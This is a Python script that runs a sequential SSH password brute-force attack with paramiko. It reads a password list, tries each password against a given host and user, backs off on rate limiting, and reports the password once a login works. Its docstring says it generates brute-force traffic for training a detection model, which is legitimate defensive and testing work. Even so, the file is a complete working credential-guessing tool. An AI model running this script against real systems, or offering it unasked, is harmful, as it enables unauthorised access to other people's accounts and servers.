#!/usr/bin/env python3
"""
Simple sequential SSH brute-force script.
Tries one password at a time to generate clean Brute Force traffic
that the AI model can distinguish from DDoS floods.
"""

import paramiko
import sys
import time
import logging

# Suppress noisy internal paramiko tracebacks
logging.getLogger("paramiko").setLevel(logging.CRITICAL)

def brute_force(host, port, username, password_file, delay=0.3):
    print(f"[*] Target: {host}:{port} | User: {username}")
    print(f"[*] Password list: {password_file}")
    print(f"[*] Delay between attempts: {delay}s")
    print("-" * 50)
    
    with open(password_file, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]
    
    total = len(passwords)
    print(f"[*] Loaded {total} passwords. Starting brute-force...\n")
    
    for i, password in enumerate(passwords, 1):
        attempts = 0
        while attempts < 3:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            try:
                client.connect(
                    hostname=host,
                    port=int(port),
                    username=username,
                    password=password,
                    timeout=5,
                    allow_agent=False,
                    look_for_keys=False,
                    banner_timeout=10
                )
                print(f"\n[+] SUCCESS! Password found: {password}")
                client.close()
                return
            except paramiko.AuthenticationException:
                if i % 10 == 0 or i <= 3:
                    print(f"  [{i}/{total}] Tried: {password} - Failed")
                break # Move to next password
            except paramiko.ssh_exception.SSHException as e:
                if "banner" in str(e).lower():
                    # SSH daemon rate limiting - back off
                    attempts += 1
                    time.sleep(1.0)
                    continue
                else:
                    print(f"  [{i}/{total}] Error: {e}")
                    break
            except Exception as e:
                print(f"  [{i}/{total}] Error: {e}")
                break
            finally:
                client.close()
            
        time.sleep(delay)
    
    print(f"\n[-] Exhausted {total} passwords. No match found.")

if __name__ == "__main__":
    try:
        if len(sys.argv) < 5:
            print(f"Usage: {sys.argv[0]} <host> <port> <username> <password_file> [delay]")
            sys.exit(1)
        
        host = sys.argv[1]
        port = sys.argv[2]
        username = sys.argv[3]
        password_file = sys.argv[4]
        delay = float(sys.argv[5]) if len(sys.argv) > 5 else 0.3
        
        brute_force(host, port, username, password_file, delay)
    except KeyboardInterrupt:
        print("\n[!] Brute-force stopped by user.")
        sys.exit(0)
